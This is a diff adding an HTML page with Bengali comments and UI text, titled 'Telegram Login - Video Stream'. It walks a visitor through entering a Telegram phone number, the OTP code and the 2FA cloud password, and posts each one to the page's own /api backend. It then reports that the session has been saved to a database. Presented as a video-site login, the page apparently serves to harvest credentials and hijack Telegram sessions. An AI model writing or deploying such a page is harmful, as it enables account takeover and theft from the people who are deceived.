@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Login - Video Stream</title>
+    <style>
+        /* বেসিক রিসেট এবং বডি স্টাইল */
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background-color: #eef2f5; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            padding: 20px;
+        }
+
+        /* কন্টেইনার স্টাইল (মোবাইল রেসপন্সিভ) */
+        .container { 
+            width: 100%; 
+            max-width: 400px; 
+            background: #ffffff; 
+            padding: 30px 25px; 
+            border-radius: 12px; 
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.08); 
+        }
+
+        h2 { text-align: center; color: #222; margin-bottom: 20px; font-size: 24px; }
+        label { display: block; margin-bottom: 8px; color: #555; font-size: 14px; font-weight: 500; }
+        
+        /* ইনপুট ফিল্ড ও বাটন */
+        input { 
+            width: 100%; 
+            padding: 12px 15px; 
+            margin-bottom: 20px; 
+            border: 1px solid #ccd0d5; 
+            border-radius: 8px; 
+            font-size: 16px; 
+            transition: border-color 0.3s;
+        }
+        input:focus { outline: none; border-color: #0088cc; box-shadow: 0 0 5px rgba(0, 136, 204, 0.3); }
+        
+        button { 
+            width: 100%; 
+            padding: 12px; 
+            background-color: #0088cc; 
+            color: white; 
+            border: none; 
+            border-radius: 8px; 
+            cursor: pointer; 
+            font-size: 16px; 
+            font-weight: 600;
+            transition: background-color 0.3s; 
+        }
+        button:hover { background-color: #0077b3; }
+
+        /* স্টেপ ও লোডিং কন্ট্রোল */
+        #step2, #step3, #loading { display: none; }
+        #loading { text-align: center; color: #0088cc; font-weight: 600; margin-bottom: 15px; }
+        
+        /* মেসেজ নোটিফিকেশন */
+        .msg-box { 
+            display: none; 
+            padding: 10px; 
+            border-radius: 6px; 
+            margin-bottom: 20px; 
+            text-align: center; 
+            font-size: 14px; 
+        }
+        .msg-success { background-color: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
+        .msg-error { background-color: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>Telegram Login</h2>
+    
+    <div id="messageBox" class="msg-box"></div>
+
+    <div id="loading">লোড হচ্ছে, দয়া করে অপেক্ষা করুন...</div>
+    
+    <div id="step1">
+        <label>আপনার টেলিগ্রাম নম্বর দিন:</label>
+        <input type="text" id="phoneNumber" placeholder="যেমন: +88017xxxxxxxx">
+        <button onclick="sendOTP()">Send OTP</button>
+    </div>
+
+    <div id="step2">
+        <label>টেলিগ্রামে আসা কোডটি দিন:</label>
+        <input type="number" id="otpCode" placeholder="5-digit code">
+        <button onclick="login()">Verify & Login</button>
+    </div>
+
+    <div id="step3">
+        <label>আপনার 2FA পাসওয়ার্ড দিন:</label>
+        <input type="password" id="password2fa" placeholder="Enter Cloud Password">
+        <button onclick="submitPassword()">Submit Password</button>
+    </div>
+</div>
+
+<script>
+    const API_URL = window.location.origin + "/api"; // অটোমেটিক লোকাল বা লাইভ লিংক ডিটেক্ট করবে
+    let phoneCodeHash = "";
+    let phoneNumber = "";
+
+    // সুন্দরভাবে মেসেজ দেখানোর ফাংশন
+    function showMessage(msg, isError = false) {
+        const msgBox = document.getElementById("messageBox");
+        msgBox.textContent = msg;
+        msgBox.className = "msg-box " + (isError ? "msg-error" : "msg-success");
+        msgBox.style.display = "block";
+    }
+
+    function hideMessage() {
+        document.getElementById("messageBox").style.display = "none";
+    }
+
+    async function sendOTP() {
+        hideMessage();
+        phoneNumber = document.getElementById("phoneNumber").value.trim();
+        if (!phoneNumber) return showMessage("দয়া করে একটি সঠিক নম্বর দিন!", true);
+
+        document.getElementById("step1").style.display = "none";
+        document.getElementById("loading").style.display = "block";
+
+        try {
+            const res = await fetch(`${API_URL}/send-code`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ phoneNumber })
+            });
+            const data = await res.json();
+
+            document.getElementById("loading").style.display = "none";
+
+            if (data.success) {
+                phoneCodeHash = data.phoneCodeHash;
+                document.getElementById("step2").style.display = "block";
+                showMessage("আপনার টেলিগ্রামে একটি OTP পাঠানো হয়েছে!");
+            } else {
+                showMessage(data.error, true);
+                document.getElementById("step1").style.display = "block";
+            }
+        } catch (error) {
+            document.getElementById("loading").style.display = "none";
+            document.getElementById("step1").style.display = "block";
+            showMessage("সার্ভারের সাথে কানেক্ট করা যাচ্ছে না!", true);
+        }
+    }
+
+    async function login() {
+        hideMessage();
+        const phoneCode = document.getElementById("otpCode").value.trim();
+        if (!phoneCode) return showMessage("দয়া করে OTP দিন!", true);
+
+        document.getElementById("step2").style.display = "none";
+        document.getElementById("loading").style.display = "block";
+
+        try {
+            const res = await fetch(`${API_URL}/login`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ phoneNumber, phoneCodeHash, phoneCode })
+            });
+            const data = await res.json();
+
+            document.getElementById("loading").style.display = "none";
+
+            if (data.success) {
+                showMessage("✅ লগইন সফল হয়েছে! সেশন ডেটাবেসে সেভ করা হয়েছে।");
+            } else if (data.requires2FA) {
+                // 2FA চালু থাকলে Step 3 ওপেন হবে
+                document.getElementById("step3").style.display = "block";
+                showMessage("আপনার অ্যাকাউন্টে 2FA চালু আছে। পাসওয়ার্ড দিন।", true);
+            } else {
+                showMessage(data.error, true);
+                document.getElementById("step2").style.display = "block";
+            }
+        } catch (error) {
+            document.getElementById("loading").style.display = "none";
+            document.getElementById("step2").style.display = "block";
+            showMessage("লগইন করতে সমস্যা হয়েছে!", true);
+        }
+    }
+
+    async function submitPassword() {
+        hideMessage();
+        const password = document.getElementById("password2fa").value.trim();
+        if (!password) return showMessage("পাসওয়ার্ড দেওয়া বাধ্যতামূলক!", true);
+
+        document.getElementById("step3").style.display = "none";
+        document.getElementById("loading").style.display = "block";
+
+        try {
+            const res = await fetch(`${API_URL}/submit-password`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ password })
+            });
+            const data = await res.json();
+
+            document.getElementById("loading").style.display = "none";
+
+            if (data.success) {
+                showMessage("✅ 2FA ভেরিফাই এবং লগইন সফল হয়েছে!");
+            } else {
+                showMessage(data.error, true);
+                document.getElementById("step3").style.display = "block";
+            }
+        } catch (error) {
+            document.getElementById("loading").style.display = "none";
+            document.getElementById("step3").style.display = "block";
+            showMessage("পাসওয়ার্ড যাচাই করতে সমস্যা হয়েছে!", true);
+        }
+    }
+</script>
+
+</body>
+</html>
